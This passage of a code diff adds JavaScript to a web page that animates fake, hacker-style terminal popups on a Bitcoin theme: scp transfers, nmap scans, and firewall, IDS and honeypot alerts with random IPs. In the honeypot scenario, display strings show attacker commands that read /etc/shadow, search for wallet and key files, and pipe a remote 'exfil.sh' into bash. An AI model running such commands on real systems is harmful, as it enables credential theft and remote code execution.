+                    { t: 'cmd', s: `diff <(echo ${hexChunk(8)}...) checksum.sha256` },
+                    { t: 'ok', s: 'Checksums match. Fragment integrity verified.' },
+                ]
+            }),
+        ];
+
+        async function spawnCmdPopup() {
+            const scenario = pick(cmdScenarioFactories)();
+            const el = createPopupEl(scenario.title, '');
+            popupLayer.appendChild(el);
+            activePopups++;
+            requestAnimationFrame(() => el.classList.add('visible'));
+
+            const body = el.querySelector('.tp-body');
+            let delay = 400;
+
+            for (const step of scenario.steps) {
+                await addLine(body, step.s, step.t, delay);
+                delay = step.t === 'cmd' ? rnd(500, 900) : rnd(200, 500);
+            }
+
+            setTimeout(() => closePopup(el), rnd(1500, 3000));
+        }
+
+        // ═══════════════════════════════════════════════
+        //  TYPE B: File Transfer with progress bar
+        // ═══════════════════════════════════════════════
+        const transferFiles = [
+            { name: 'wallet_backup_encrypted.dat', size: '4.7 MB', from: 'onion-node-7F' },
+            { name: 'block_headers_888k.bin', size: '67.2 MB', from: 'peer-0xA1F0' },
+            { name: 'utxo_snapshot.lz4', size: '12.1 MB', from: 'archive.node' },
+            { name: 'mempool_dump_' + hexChunk(4) + '.raw', size: '23.8 MB', from: 'seed-0x3E8D' },
+            { name: 'chainstate_delta.patch', size: '8.4 MB', from: 'relay-DE-04' },
+            { name: 'keyring_export.gpg', size: '1.2 MB', from: 'vault-0xC1PH3R' },
+            { name: 'peer_graph_snapshot.json', size: '3.9 MB', from: 'monitor-0x7B1C' },
+        ];
+
+        async function spawnTransferPopup() {
+            const file = pick(transferFiles);
+            const el = createPopupEl('scp — file transfer', 'amber-border');
+            popupLayer.appendChild(el);
+            activePopups++;
+            requestAnimationFrame(() => el.classList.add('visible'));
+
+            const body = el.querySelector('.tp-body');
+
+            await addLine(body, `scp -P 2222 ${file.from}:~/${file.name} ./drop/`, 'cmd', 300);
+            await addLine(body, `Connecting to ${file.from}...`, 'out', 600);
+            await addLine(body, `Authenticated — starting transfer`, 'out', 400);
+
+            // File name + size line
+            await addLine(body, `${file.name}  [${file.size}]`, 'out', 300);
+
+            // Progress bar
+            await new Promise(resolve => {
+                setTimeout(() => {
+                    const wrap = document.createElement('div');
+                    wrap.className = 'tp-progress-wrap';
+                    wrap.innerHTML = '<div class="tp-progress-bar"></div><div class="tp-progress-text">0%</div>';
+                    body.appendChild(wrap);
+
+                    const bar = wrap.querySelector('.tp-progress-bar');
+                    const txt = wrap.querySelector('.tp-progress-text');
+                    let pct = 0;
+                    const iv = setInterval(() => {
+                        pct += rnd(3, 12);
+                        if (pct >= 100) {
+                            pct = 100;
+                            clearInterval(iv);
+                            setTimeout(resolve, 200);
+                        }
+                        bar.style.width = pct + '%';
+                        txt.textContent = Math.floor(pct) + '%';
+                    }, rnd(100, 250));
+                }, 200);
+            });
+
+            await addLine(body, `${file.size} transferred — SHA256 verified`, 'ok', 300);
+
+            setTimeout(() => closePopup(el), rnd(1200, 2500));
+        }
+
+        // ═══════════════════════════════════════════════
+        //  TYPE C: Network Scan
+        // ═══════════════════════════════════════════════
+        const scanPorts = [22, 80, 443, 8080, 8333, 9050, 9735, 18333, 28333, 50001, 50002];
+        const scanServices = ['ssh', 'http', 'https', 'http-proxy', 'bitcoin', 'tor-socks', 'lightning', 'bitcoin-test', 'bitcoin-p2p', 'electrum', 'electrum-ssl'];
+
+        async function spawnScanPopup() {
+            const target = rndIP() + '/24';
+            const el = createPopupEl('nmap — network scan', 'red-border');
+            popupLayer.appendChild(el);
+            activePopups++;
+            requestAnimationFrame(() => el.classList.add('visible'));
+
+            const body = el.querySelector('.tp-body');
+
+            await addLine(body, `nmap -sS -T4 -p 22,80,443,8333,9050,9735 ${target}`, 'cmd', 300);
+            await addLine(body, `Starting Nmap 7.94 — https://nmap.org`, 'out', 500);
+            await addLine(body, `Scanning ${Math.floor(rnd(3, 12))} hosts on ${target}...`, 'out', 600);
+
+            const numResults = Math.floor(rnd(4, 9));
+            let delay = 400;
+            for (let i = 0; i < numResults; i++) {
+                const ip = rndIP();
+                const portIdx = Math.floor(Math.random() * scanPorts.length);
+                const port = scanPorts[portIdx];
+                const svc = scanServices[portIdx];
+                const state = Math.random() > 0.2 ? 'open' : 'filtered';
+                const cls = state === 'open' ? 'out' : 'warn';
+                await addLine(body, `${ip}:${port}  ${state.padEnd(10)} ${svc}`, cls, delay);
+                delay = rnd(150, 400);
+            }
+
+            const openCount = Math.floor(rnd(2, numResults));
+            await addLine(body, `Scan complete: ${numResults} hosts, ${openCount} with open ports`, 'ok', 500);
+
+            setTimeout(() => closePopup(el), rnd(1500, 3000));
+        }
+
+        // ═══════════════════════════════════════════════
+        //  TYPE D: Perimeter Defense / IDS
+        // ═══════════════════════════════════════════════
+        const attackVectors = ['SYN flood', 'port scan', 'brute force SSH', 'DNS amplification', 'HTTP slowloris', 'ICMP flood', 'NTP reflection', 'credential stuffing'];
+        const attackOrigins = ['CN', 'RU', 'KP', 'IR', 'BR', 'UA', 'RO', 'VN', 'NG', 'PK'];
+
+        function makeAsciiFirewall(blocked, passed) {
+            // small ASCII traffic diagram
+            const total = blocked + passed;
+            const barLen = 28;
+            const blockedLen = Math.round((blocked / total) * barLen);
+            const passedLen = barLen - blockedLen;
+            return [
+                `  IN ══╦══${'█'.repeat(blockedLen)}${'░'.repeat(passedLen)}══╦══ OUT`,
+                `       ║  BLOCKED: ${blocked}`.padEnd(32) + `║`,
+                `       ║  PASSED:  ${passed}`.padEnd(32) + `║`,
+                `       ╚${'═'.repeat(30)}╝`,
+            ];
+        }
+
+        function makeTrafficSparkline() {
+            // random packet-rate sparkline
+            const chars = ' ▁▂▃▄▅▆▇█';
+            let line = '  pkt/s ';
+            for (let i = 0; i < 30; i++) {
+                // simulate a spike in the middle
+                const base = i > 10 && i < 20 ? rnd(5, 8) : rnd(0, 4);
+                line += chars[Math.min(Math.floor(base), chars.length - 1)];
+            }
+            return line;
+        }
+
+        function makeBruteForceLog() {
+            const user = pick(['root', 'admin', 'postgres', 'bitcoin', 'satoshi', 'deploy', 'ubuntu']);
+            const attempts = Math.floor(rnd(47, 380));
+            const rows = [];
+            for (let i = 0; i < 4; i++) {
+                rows.push(`  ${rndIP().padEnd(16)} → ${user}  [DENIED]  attempt ${Math.floor(rnd(1, attempts))}/${attempts}`);
+            }
+            return { user, attempts, rows };
+        }
+
+        const idsScenarioFactories = [
+            // ── Firewall block with traffic diagram ──
+            () => {
+                const attack = pick(attackVectors);
+                const origin = pick(attackOrigins);
+                const srcIP = rndIP();
+                const blocked = Math.floor(rnd(1200, 24000));
+                const passed = Math.floor(rnd(80, 400));
+                const fwLines = makeAsciiFirewall(blocked, passed);
+                return {
+                    title: 'iptables — perimeter firewall',
+                    variant: 'red-border',
+                    steps: [
+                        { t: 'err', s: `⚠ ALERT: ${attack} detected from ${srcIP} [${origin}]` },
+                        { t: 'out', s: `Source: ${srcIP}:${Math.floor(rnd(1024, 65535))} → *:${pick([22, 80, 443, 8333])}` },
+                        { t: 'out', s: makeTrafficSparkline() },
+                        { t: 'cmd', s: `iptables -A INPUT -s ${srcIP}/24 -j DROP` },
+                        { t: 'out', s: fwLines[0] },
+                        { t: 'out', s: fwLines[1] },
+                        { t: 'out', s: fwLines[2] },
+                        { t: 'out', s: fwLines[3] },
+                        { t: 'ok', s: `${blocked} packets dropped. Perimeter secured.` },
+                    ]
+                };
+            },
+
+            // ── IDS alert cascade ──
+            () => {
+                const srcIP = rndIP();
+                const origin = pick(attackOrigins);
+                const sigId = Math.floor(rnd(2000000, 2099999));
+                return {
+                    title: 'suricata — intrusion detection',
+                    variant: 'red-border',
+                    steps: [
+                        { t: 'err', s: `[**] [1:${sigId}:3] ET SCAN Potential SSH Brute Force [**]` },
+                        { t: 'warn', s: `[Classification: Attempted Admin Access] [Priority: 1]` },
+                        { t: 'out', s: `${srcIP}:${Math.floor(rnd(30000, 60000))} → 10.0.0.1:22` },
+                        { t: 'out', s: `  ┌─ Severity: ████████░░ HIGH` },
+                        { t: 'out', s: `  ├─ Confidence: 97.${Math.floor(rnd(1, 9))}%` },
+                        { t: 'out', s: `  ├─ Origin: ${origin} (ASN ${Math.floor(rnd(10000, 65000))})` },
+                        { t: 'out', s: `  └─ Reputation: BLACKLISTED` },
+                        { t: 'cmd', s: `fail2ban-client set sshd banip ${srcIP}` },
+                        { t: 'ok', s: `Ban applied. Jail: sshd [${Math.floor(rnd(12, 89))} active bans]` },
+                    ]
+                };
+            },
+
+            // ── DDoS mitigation with live rate ──
+            () => {
+                const attack = pick(['SYN flood', 'UDP amplification', 'HTTP flood', 'DNS reflection']);
+                const peakRate = Math.floor(rnd(50, 800));
+                const unit = peakRate > 200 ? 'Mbps' : 'Kpps';
+                return {
+                    title: 'ddos-guard — mitigation active',
+                    variant: 'red-border',
+                    steps: [
+                        { t: 'err', s: `⚠ DDoS DETECTED: ${attack}` },
+                        { t: 'out', s: makeTrafficSparkline() },
+                        { t: 'warn', s: `  Peak: ${peakRate} ${unit} from ${Math.floor(rnd(40, 3000))} unique sources` },
+                        { t: 'out', s: `  ┌────────── MITIGATION ──────────┐` },
+                        { t: 'out', s: `  │  Rate limiting:      ACTIVE    │` },
+                        { t: 'out', s: `  │  GeoIP filter:       ${pick(['CN', 'RU', 'KP'])} BLOCKED │` },
+                        { t: 'out', s: `  │  SYN cookies:        ENABLED   │` },
+                        { t: 'out', s: `  │  Challenge mode:     ON        │` },
+                        { t: 'out', s: `  └────────────────────────────────┘` },
+                        { t: 'ok', s: `Traffic normalized. Attack mitigated in ${Math.floor(rnd(4, 18))}s.` },
+                    ]
+                };
+            },
+
+            // ── Brute force login defense ──
+            () => {
+                const bf = makeBruteForceLog();
+                return {
+                    title: 'fail2ban — auth monitor',
+                    variant: 'red-border',
+                    steps: [
+                        { t: 'err', s: `⚠ Brute force on user "${bf.user}" — ${bf.attempts} attempts` },
+                        { t: 'out', s: bf.rows[0] },
+                        { t: 'out', s: bf.rows[1] },
+                        { t: 'out', s: bf.rows[2] },
+                        { t: 'out', s: bf.rows[3] },
+                        { t: 'out', s: `  ...${bf.attempts - 4} more attempts suppressed` },
+                        { t: 'cmd', s: `ufw deny from ${bf.rows[0].trim().split(' ')[0]}` },
+                        { t: 'cmd', s: `ufw deny from ${bf.rows[1].trim().split(' ')[0]}` },
+                        { t: 'ok', s: `${Math.floor(rnd(2, 6))} IPs banned. Auth hardened.` },
+                    ]
+                };
+            },
+
+            // ── Honeypot trip with ASCII map ──
+            () => {
+                const srcIP = rndIP();
+                const origin = pick(attackOrigins);
+                return {
+                    title: 'honeypot — trap triggered',
+                    variant: 'red-border',
+                    steps: [
+                        { t: 'err', s: `⚠ TRIPWIRE: unauthorized access to decoy service` },
+                        { t: 'out', s: `  Attacker: ${srcIP} [${origin}]` },
+                        { t: 'out', s: `  Target:   10.0.0.99:${pick([22, 3306, 5432, 6379, 8333])} (honeypot)` },
+                        { t: 'out', s: `  Session:  ${hexChunk(12)}` },
+                        { t: 'warn', s: `  Commands captured:` },
+                        { t: 'out', s: `    $ cat /etc/shadow` },
+                        { t: 'out', s: `    $ find / -name "*.wallet" -o -name "*.key"` },
+                        { t: 'out', s: `    $ curl http://${rndIP()}/exfil.sh | bash` },
+                        { t: 'cmd', s: `iptables -A INPUT -s ${srcIP} -j DROP && logger "HONEYPOT_ALERT"` },
+                        { t: 'ok', s: `Attacker session terminated. Intel logged.` },
+                    ]
+                };
+            },
+        ];
+
+        async function spawnIdsPopup() {
+            const scenario = pick(idsScenarioFactories)();
+            const el = createPopupEl(scenario.title, scenario.variant);
+            popupLayer.appendChild(el);
+            activePopups++;
+            requestAnimationFrame(() => el.classList.add('visible'));
+
+            const body = el.querySelector('.tp-body');
+            let delay = 300;
+
+            for (const step of scenario.steps) {
+                await addLine(body, step.s, step.t, delay);
+                delay = step.t === 'err' ? rnd(600, 1000) : step.t === 'cmd' ? rnd(400, 700) : rnd(150, 400);
+            }
+
+            setTimeout(() => closePopup(el), rnd(2000, 4000));
+        }
+
+        // ═══════════════════════════════════════════════
+        //  POPUP SCHEDULER
+        // ═══════════════════════════════════════════════
+        const popupTypes = [spawnCmdPopup, spawnTransferPopup, spawnScanPopup, spawnIdsPopup];
+
+        function scheduleNextPopup() {
+            if (!running || paused) {
+                popupScheduler = setTimeout(scheduleNextPopup, 2000);
+                return;
+            }
+
+            // Spawn 1 popup, sometimes 2
+            if (activePopups < 3) {
+                pick(popupTypes)();
+
+                // 30% chance of a second popup 1-3s later
+                if (Math.random() < 0.3 && activePopups < 2) {
+                    setTimeout(() => {
+                        if (running && !paused && activePopups < 3) {
+                            pick(popupTypes)();
+                        }
+                    }, rnd(800, 2500));
+                }
+            }
+
+            // Next popup in 7-16 seconds
+            const nextDelay = rnd(7000, 16000);
+            popupScheduler = setTimeout(scheduleNextPopup, nextDelay);
+        }
+
+        function startPopups() {
+            // First popup after 3-5 seconds
+            popupScheduler = setTimeout(scheduleNextPopup, rnd(3000, 5000));
+        }
+
+        function stopPopups() {
+            if (popupScheduler) clearTimeout(popupScheduler);
+            // Remove any remaining
+            popupLayer.innerHTML = '';
+            activePopups = 0;
+        }
+    </script>
+</body>
+
+</html>
